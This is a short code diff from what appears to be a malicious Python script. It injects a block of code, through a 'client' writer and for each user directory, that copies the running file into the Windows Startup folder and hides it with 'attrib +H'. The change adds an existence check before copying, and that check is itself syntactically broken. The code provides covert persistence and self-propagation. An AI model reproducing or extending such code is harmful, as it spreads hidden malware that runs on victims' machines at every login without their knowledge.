@@ -49,9 +49,10 @@ for user in os.listdir(userspath):
             startupcontent="""
 filename = os.path.basename(__file__)
 destin = os.path.expandvars(fr"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
-destin_file = os.path.join(destin, filename)
-shutil.copy(__file__, destin_file)
-os.system(f'attrib +H "{destin_file}\{filename}"')
+if not os.path.exists(fr"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\{os.path.basename(__file__)}")
+    destin_file = os.path.join(destin, filename)
+    shutil.copy(__file__, destin_file)
+    os.system(f'attrib +H "{destin_file}\{filename}"')
 
     """
         client.write(startupcontent)
